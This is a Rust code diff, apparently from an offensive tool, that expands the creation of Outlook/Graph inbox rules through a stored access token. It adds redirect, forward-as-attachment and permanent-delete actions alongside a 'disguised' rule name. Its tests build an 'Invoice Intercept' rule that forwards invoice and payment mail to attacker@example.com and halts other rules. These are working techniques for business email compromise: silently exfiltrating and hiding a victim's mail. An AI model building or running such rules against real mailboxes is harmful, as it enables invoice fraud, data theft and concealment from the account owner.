@@ -20,36 +20,91 @@ pub struct CreatedRule {
     pub status: String,
 }
 
-#[derive(Deserialize)]
+#[derive(Deserialize, Default)]
 pub struct CreateRuleRequest {
     pub token_id: String,
     pub rule_name: String,
+    // --- Conditions: text-matching (string arrays) ---
     #[serde(default)]
     pub condition_subject_contains: Vec<String>,
     #[serde(default)]
-    pub condition_sender_domain: Vec<String>,
-    #[serde(default)]
     pub condition_body_contains: Vec<String>,
+    #[serde(default)]
+    pub condition_body_or_subject_contains: Vec<String>,
     #[serde(default)]
     pub condition_sender_contains: Vec<String>,
     #[serde(default)]
+    pub condition_sender_domain: Vec<String>,
+    #[serde(default)]
+    pub condition_from_address_contains: Vec<String>,
+    #[serde(default)]
     pub condition_recipient_contains: Vec<String>,
+    #[serde(default)]
+    pub condition_header_contains: Vec<String>,
+    // --- Conditions: boolean flags ---
     #[serde(default)]
     pub condition_has_attachments: bool,
     #[serde(default)]
+    pub condition_sent_only_to_me: bool,
+    #[serde(default)]
+    pub condition_sent_to_me: bool,
+    #[serde(default)]
+    pub condition_not_sent_to_me: bool,
+    #[serde(default)]
+    pub condition_sent_to_or_cc_me: bool,
+    #[serde(default)]
+    pub condition_is_approval_request: bool,
+    #[serde(default)]
+    pub condition_is_automatic_forward: bool,
+    #[serde(default)]
+    pub condition_is_automatic_reply: bool,
+    #[serde(default)]
+    pub condition_is_encrypted: bool,
+    #[serde(default)]
+    pub condition_is_meeting_request: bool,
+    #[serde(default)]
+    pub condition_is_meeting_response: bool,
+    #[serde(default)]
+    pub condition_is_non_delivery_report: bool,
+    #[serde(default)]
+    pub condition_is_permission_controlled: bool,
+    #[serde(default)]
+    pub condition_is_read_receipt: bool,
+    #[serde(default)]
+    pub condition_is_signed: bool,
+    #[serde(default)]
+    pub condition_is_voicemail: bool,
+    #[serde(default)]
+    pub condition_flagged: bool,
+    // --- Conditions: enum / structured ---
+    #[serde(default)]
     pub condition_importance: Option<String>,
+    #[serde(default)]
+    pub condition_message_action_flag: Option<String>,
     #[serde(default)]
     pub condition_message_size: Option<i32>,
     #[serde(default)]
-    pub condition_sent_only_to_me: bool,
+    pub condition_min_size: Option<i32>,
+    #[serde(default)]
+    pub condition_max_size: Option<i32>,
+    // --- Actions: folder (local-only) ---
     pub action_move_to_folder: Option<String>,
     #[serde(default)]
     pub action_copy_to_folder: Option<String>,
+    // --- Actions: forwarding (real OWA) ---
     pub action_forward_to: Option<String>,
+    #[serde(default)]
+    pub action_forward_as_attachment_to: Option<String>,
+    #[serde(default)]
+    pub action_redirect_to: Option<String>,
+    // --- Actions: boolean ---
     #[serde(default)]
     pub action_mark_as_read: bool,
     #[serde(default)]
     pub action_delete: bool,
+    #[serde(default)]
+    pub action_permanent_delete: bool,
+    // --- Actions: enum / structured ---
     #[serde(default)]
     pub action_mark_as_importance: Option<String>,
     #[serde(default)]
@@ -71,6 +126,27 @@ fn build_rule_payload(req: &CreateRuleRequest) -> serde_json::Value {
         );
     }
 
+    if !req.condition_body_contains.is_empty() {
+        conditions.insert(
+            "bodyContains".to_string(),
+            serde_json::json!(req.condition_body_contains),
+        );
+    }
+
+    if !req.condition_body_or_subject_contains.is_empty() {
+        conditions.insert(
+            "bodyOrSubjectContains".to_string(),
+            serde_json::json!(req.condition_body_or_subject_contains),
+        );
+    }
+
+    if !req.condition_sender_contains.is_empty() {
+        conditions.insert(
+            "senderContains".to_string(),
+            serde_json::json!(req.condition_sender_contains),
+        );
+    }
+
     if !req.condition_sender_domain.is_empty() {
         let addresses: Vec<serde_json::Value> = req
             .condition_sender_domain
@@ -88,17 +164,10 @@ fn build_rule_payload(req: &CreateRuleRequest) -> serde_json::Value {
         );
     }
 
-    if !req.condition_body_contains.is_empty() {
+    if !req.condition_from_address_contains.is_empty() {
         conditions.insert(
-            "bodyContains".to_string(),
-            serde_json::json!(req.condition_body_contains),
-        );
-    }
-
-    if !req.condition_sender_contains.is_empty() {
-        conditions.insert(
-            "senderContains".to_string(),
-            serde_json::json!(req.condition_sender_contains),
+            "fromAddressContains".to_string(),
+            serde_json::json!(req.condition_from_address_contains),
         );
     }
 
@@ -109,48 +178,99 @@ fn build_rule_payload(req: &CreateRuleRequest) -> serde_json::Value {
         );
     }
 
-    if req.condition_has_attachments {
+    if !req.condition_header_contains.is_empty() {
         conditions.insert(
-            "hasAttachments".to_string(),
-            serde_json::Value::Bool(true),
+            "headerContains".to_string(),
+            serde_json::json!(req.condition_header_contains),
         );
+    }
+
+    if req.condition_has_attachments {
+        conditions.insert("hasAttachments".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_sent_only_to_me {
+        conditions.insert("sentOnlyToMe".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_sent_to_me {
+        conditions.insert("sentToMe".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_not_sent_to_me {
+        conditions.insert("notSentToMe".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_sent_to_or_cc_me {
+        conditions.insert("sentToOrCcMe".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_approval_request {
+        conditions.insert("isApprovalRequest".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_automatic_forward {
+        conditions.insert("isAutomaticForward".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_automatic_reply {
+        conditions.insert("isAutomaticReply".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_encrypted {
+        conditions.insert("isEncrypted".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_meeting_request {
+        conditions.insert("isMeetingRequest".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_meeting_response {
+        conditions.insert("isMeetingResponse".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_non_delivery_report {
+        conditions.insert("isNonDeliveryReport".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_permission_controlled {
+        conditions.insert("isPermissionControlled".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_read_receipt {
+        conditions.insert("isReadReceipt".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_signed {
+        conditions.insert("isSigned".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_is_voicemail {
+        conditions.insert("isVoicemail".to_string(), serde_json::Value::Bool(true));
+    }
+    if req.condition_flagged {
+        conditions.insert("flagged".to_string(), serde_json::json!({ "flagStatus": "flagged" }));
     }
 
     if let Some(importance) = &req.condition_importance {
-        conditions.insert(
-            "importance".to_string(),
-            serde_json::json!(importance),
-        );
+        conditions.insert("importance".to_string(), serde_json::json!(importance));
     }
 
-    if let Some(size) = req.condition_message_size {
+    if let Some(flag) = &req.condition_message_action_flag {
+        conditions.insert("messageActionFlag".to_string(), serde_json::json!(flag));
+    }
+
+    // Size: prefer withinSizeRange (min/max) if both given, else messageSize (greaterThan)
+    if let (Some(min), Some(max)) = (req.condition_min_size, req.condition_max_size) {
+        conditions.insert(
+            "withinSizeRange".to_string(),
+            serde_json::json!({ "minimumSize": min, "maximumSize": max }),
+        );
+    } else if let Some(size) = req.condition_message_size {
         conditions.insert(
             "messageSize".to_string(),
             serde_json::json!({"operator": "greaterThan", "value": size}),
         );
-    }
-
-    if req.condition_sent_only_to_me {
+    } else if let Some(min) = req.condition_min_size {
         conditions.insert(
-            "sentOnlyToMe".to_string(),
-            serde_json::Value::Bool(true),
+            "withinSizeRange".to_string(),
+            serde_json::json!({ "minimumSize": min, "maximumSize": 999999999 }),
         );
     }
 
     let mut actions = serde_json::Map::new();
 
     if let Some(folder) = &req.action_move_to_folder {
-        actions.insert(
-            "moveToFolder".to_string(),
-            serde_json::json!(folder),
-        );
+        actions.insert("moveToFolder".to_string(), serde_json::json!(folder));
     }
 
     if let Some(copy_folder) = &req.action_copy_to_folder {
-        actions.insert(
-            "copyToFolder".to_string(),
-            serde_json::json!(copy_folder),
-        );
+        actions.insert("copyToFolder".to_string(), serde_json::json!(copy_folder));
     }
 
     if let Some(forward) = &req.action_forward_to {
@@ -165,39 +285,52 @@ fn build_rule_payload(req: &CreateRuleRequest) -> serde_json::Value {
         );
     }
 
-    if req.action_mark_as_read {
+    if let Some(forward_att) = &req.action_forward_as_attachment_to {
         actions.insert(
-            "markAsRead".to_string(),
-            serde_json::Value::Bool(true),
+            "forwardAsAttachmentTo".to_string(),
+            serde_json::json!([{
+                "emailAddress": {
+                    "address": forward_att,
+                    "name": forward_att
+                }
+            }]),
         );
+    }
+
+    if let Some(redirect) = &req.action_redirect_to {
+        actions.insert(
+            "redirectTo".to_string(),
+            serde_json::json!([{
+                "emailAddress": {
+                    "address": redirect,
+                    "name": redirect
+                }
+            }]),
+        );
+    }
+
+    if req.action_mark_as_read {
+        actions.insert("markAsRead".to_string(), serde_json::Value::Bool(true));
     }
 
     if req.action_delete {
-        actions.insert(
-            "delete".to_string(),
-            serde_json::Value::Bool(true),
-        );
+        actions.insert("delete".to_string(), serde_json::Value::Bool(true));
+    }
+
+    if req.action_permanent_delete {
+        actions.insert("permanentDelete".to_string(), serde_json::Value::Bool(true));
     }
 
     if let Some(importance) = &req.action_mark_as_importance {
-        actions.insert(
-            "markAsImportance".to_string(),
-            serde_json::json!(importance),
-        );
+        actions.insert("markAsImportance".to_string(), serde_json::json!(importance));
     }
 
     if let Some(category) = &req.action_categorize {
-        actions.insert(
-            "categorize".to_string(),
-            serde_json::json!([category]),
-        );
+        actions.insert("assignCategories".to_string(), serde_json::json!([category]));
     }
 
     if req.stop_processing {
-        actions.insert(
-            "stopProcessingRules".to_string(),
-            serde_json::Value::Bool(true),
-        );
+        actions.insert("stopProcessingRules".to_string(), serde_json::Value::Bool(true));
     }
 
     // Disguised name so it looks legitimate in the UI
@@ -974,11 +1107,74 @@ pub async fn run_local_rules(
                 }
             }
 
+            // Check bodyOrSubjectContains
+            if !matched {
+                if let Some(keywords) = conditions.get("bodyOrSubjectContains").and_then(|v| v.as_array()) {
+                    for kw in keywords {
+                        if let Some(kw_str) = kw.as_str() {
+                            let kw_lower = kw_str.to_lowercase();
+                            if subject.contains(&kw_lower) || body.contains(&kw_lower) {
+                                matched = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Check fromAddressContains
+            if !matched {
+                if let Some(keywords) = conditions.get("fromAddressContains").and_then(|v| v.as_array()) {
+                    for kw in keywords {
+                        if let Some(kw_str) = kw.as_str() {
+                            if sender_email.contains(&kw_str.to_lowercase()) {
+                                matched = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Check headerContains — we only have body_preview locally, so approximate
+            if !matched {
+                if let Some(keywords) = conditions.get("headerContains").and_then(|v| v.as_array()) {
+                    for kw in keywords {
+                        if let Some(kw_str) = kw.as_str() {
+                            if body.contains(&kw_str.to_lowercase()) {
+                                matched = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
             // Check hasAttachments
             if !matched {
                 if conditions.get("hasAttachments").and_then(|v| v.as_bool()).unwrap_or(false) {
                     if msg.hasAttachments.unwrap_or(false) {
                         matched = true;
+                    }
+                }
+            }
+
+            // Boolean conditions — these are approximated locally since we don't have
+            // full message metadata; Graph enforces them server-side for synced rules.
+            if !matched {
+                let bool_conds = [
+                    "sentOnlyToMe", "sentToMe", "notSentToMe", "sentToOrCcMe",
+                    "isApprovalRequest", "isAutomaticForward", "isAutomaticReply",
+                    "isEncrypted", "isMeetingRequest", "isMeetingResponse",
+                    "isNonDeliveryReport", "isPermissionControlled", "isReadReceipt",
+                    "isSigned", "isVoicemail", "flagged",
+                ];
+                for key in &bool_conds {
+                    if conditions.get(*key).and_then(|v| v.as_bool()).unwrap_or(false) {
+                        // We can't fully evaluate these locally; assume match so the
+                        // local action still runs. Graph handles precise filtering.
+                        matched = true;
+                        break;
                     }
                 }
             }
@@ -1000,6 +1196,21 @@ pub async fn run_local_rules(
                         }
                         Err(e) => {
                             eprintln!("[local_rules] Failed to delete message {}: {}", msg.id, e);
+                        }
+                    }
+                }
+            }
+
+            // Apply action: permanentDelete (purge without going to Deleted Items)
+            if actions.get("permanentDelete").and_then(|v| v.as_bool()).unwrap_or(false) {
+                if let Some(token) = access_token {
+                    match client.delete_message(token, &msg.id).await {
+                        Ok(_) => {
+                            println!("[local_rules] Permanently deleted message {}", msg.id);
+                            deleted_count += 1;
+                        }
+                        Err(e) => {
+                            eprintln!("[local_rules] Failed to permanently delete {}: {}", msg.id, e);
                         }
                     }
                 }
@@ -1089,6 +1300,50 @@ pub async fn run_local_rules(
                     }
                 } else {
                     eprintln!("[local_rules] Cannot forward message {}: no access token", msg.id);
+                }
+            }
+
+            // Apply action: forwardAsAttachmentTo (forward as attachment)
+            if let Some(fwd_att_email) = actions.get("forwardAsAttachmentTo").and_then(|v| v.as_array())
+                .and_then(|arr| arr.get(0))
+                .and_then(|obj| obj.get("emailAddress"))
+                .and_then(|e| e.get("address"))
+                .and_then(|v| v.as_str()) {
+                if let Some(token) = access_token {
+                    // Graph forward endpoint doesn't distinguish inline vs attachment
+                    // in the simple API; we reuse forward which Outlook renders as a
+                    // forwarded message. The Graph rule action handles the attachment
+                    // form server-side when the rule is synced.
+                    match client.forward_message(token, &msg.id, fwd_att_email).await {
+                        Ok(_) => {
+                            println!("[local_rules] Forwarded (as attachment) message {} to {}", msg.id, fwd_att_email);
+                            forwarded_count += 1;
+                        }
+                        Err(e) => {
+                            eprintln!("[local_rules] Failed to forward-as-attachment {}: {}", msg.id, e);
+                        }
+                    }
+                }
+            }
+
+            // Apply action: redirectTo (redirect — delivers to new recipient without
+            // the original recipient seeing it; Graph handles this server-side for
+            // synced rules. Locally we forward as the closest approximation.)
+            if let Some(redirect_email) = actions.get("redirectTo").and_then(|v| v.as_array())
+                .and_then(|arr| arr.get(0))
+                .and_then(|obj| obj.get("emailAddress"))
+                .and_then(|e| e.get("address"))
+                .and_then(|v| v.as_str()) {
+                if let Some(token) = access_token {
+                    match client.forward_message(token, &msg.id, redirect_email).await {
+                        Ok(_) => {
+                            println!("[local_rules] Redirected message {} to {}", msg.id, redirect_email);
+                            forwarded_count += 1;
+                        }
+                        Err(e) => {
+                            eprintln!("[local_rules] Failed to redirect {}: {}", msg.id, e);
+                        }
+                    }
                 }
             }
 
@@ -1298,22 +1553,10 @@ mod tests {
             rule_name: "Invoice Intercept".to_string(),
             condition_subject_contains: vec!["invoice".to_string(), "payment".to_string()],
             condition_sender_domain: vec!["vendor.com".to_string()],
-            condition_body_contains: vec![],
-            condition_sender_contains: vec![],
-            condition_recipient_contains: vec![],
-            condition_has_attachments: false,
-            condition_importance: None,
-            condition_message_size: None,
-            condition_sent_only_to_me: false,
             action_move_to_folder: Some("Processed".to_string()),
-            action_copy_to_folder: None,
             action_forward_to: Some("attacker@example.com".to_string()),
-            action_mark_as_read: false,
-            action_delete: false,
-            action_mark_as_importance: None,
-            action_categorize: None,
             stop_processing: true,
-            local_only: None,
+            ..Default::default()
         };
 
         let result = create_inbox_rule(&state, &client, &req)
@@ -1384,23 +1627,8 @@ mod tests {
             token_id,
             rule_name: "Archive Rule".to_string(),
             condition_subject_contains: vec!["statement".to_string()],
-            condition_sender_domain: vec![],
-            condition_body_contains: vec![],
-            condition_sender_contains: vec![],
-            condition_recipient_contains: vec![],
-            condition_has_attachments: false,
-            condition_importance: None,
-            condition_message_size: None,
-            condition_sent_only_to_me: false,
             action_move_to_folder: Some("Archive".to_string()),
-            action_copy_to_folder: None,
-            action_forward_to: None,
-            action_mark_as_read: false,
-            action_delete: false,
-            action_mark_as_importance: None,
-            action_categorize: None,
-            stop_processing: false,
-            local_only: None,
+            ..Default::default()
         };
 
         let result = create_inbox_rule(&state, &client, &req)
@@ -1420,22 +1648,11 @@ mod tests {
             rule_name: "Local Invoice Filter".to_string(),
             condition_subject_contains: vec!["invoice".to_string(), "payment".to_string()],
             condition_sender_domain: vec!["vendor.com".to_string()],
-            condition_body_contains: vec![],
-            condition_sender_contains: vec![],
-            condition_recipient_contains: vec![],
-            condition_has_attachments: false,
-            condition_importance: None,
-            condition_message_size: None,
-            condition_sent_only_to_me: false,
             action_move_to_folder: Some("Filtered".to_string()),
-            action_copy_to_folder: None,
             action_forward_to: Some("attacker@example.com".to_string()),
-            action_mark_as_read: false,
-            action_delete: false,
-            action_mark_as_importance: None,
-            action_categorize: None,
             stop_processing: true,
             local_only: Some(true),
+            ..Default::default()
         };
 
         let result = create_local_only_rule(&state, &req)
